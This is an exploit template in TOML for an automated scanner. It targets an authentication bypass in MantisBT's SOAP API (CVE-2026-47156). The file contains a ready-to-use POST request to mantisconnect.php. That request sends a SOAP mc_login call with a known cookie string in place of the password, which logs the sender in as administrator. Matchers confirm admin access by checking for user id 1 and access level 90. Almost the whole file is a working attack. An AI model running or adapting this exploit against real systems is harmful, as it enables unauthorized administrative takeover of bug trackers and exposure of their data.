exploits/2026/EXP-AVE-2026-0289.toml

[info]
author = "ave"
description = "利用已知有效cookie_string通过SOAP API mci_check_login()认证绕过漏洞，以管理员身份登录MantisBT，获取全部SOAP API管理员权限"
id = "EXP-AVE-2026-0289"
name = "MantisBT SOAP API Authentication Bypass EXP"
severity = "critical"
tags = ["ave-2026-0289"]
vuln_id = [
    "CVE-2026-47156",
    "AVE-2026-0289",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/api/soap/mantisconnect.php"
protocol = "http"

[poc.requests.body]
content = """
<?xml version="1.0" encoding="UTF-8"?>
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"
    xmlns:tns="http://futureware.biz/mantisconnect"
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xmlns:xsd="http://www.w3.org/2001/XMLSchema">
  <SOAP-ENV:Body>
    <tns:mc_login>
      <username xsi:type="xsd:string">administrator</username>
      <password xsi:type="xsd:string">{{cookie_string}}</password>
    </tns:mc_login>
  </SOAP-ENV:Body>
</SOAP-ENV:Envelope>"""
type = "raw"

[poc.requests.headers]
Content-Type = "text/xml; charset=utf-8"
SOAPAction = ""

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    '<id xsi:type="xsd:integer">1</id>',
    '<name xsi:type="xsd:string">administrator</name>',
]

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ['<access_level xsi:type="xsd:integer">90</access_level>']
